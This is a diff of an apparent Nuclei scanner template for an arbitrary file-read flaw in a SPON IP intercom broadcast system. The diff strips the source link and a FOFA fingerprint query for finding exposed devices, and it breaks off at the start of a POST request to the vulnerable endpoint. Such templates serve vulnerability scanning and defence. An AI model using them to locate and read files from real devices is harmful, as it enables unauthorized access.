@@ -3,12 +3,8 @@ info:
   name: SPON IP网络对讲广播系统 phprj_get_token.php 存在任意文件读取漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/xlmxtgghk7bz87vt'
+  description: ''
   tags: lfi,2026
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: xlmxtgghk7bz87vt
-    fofa: body="window.MarkerClusterer=MarkerClusterer" && body="create-react-app" || body="vendors/custom/html5.min.js"
 http:
 - raw:
   - 'POST /php/rj_get_token.php HTTP/1.1
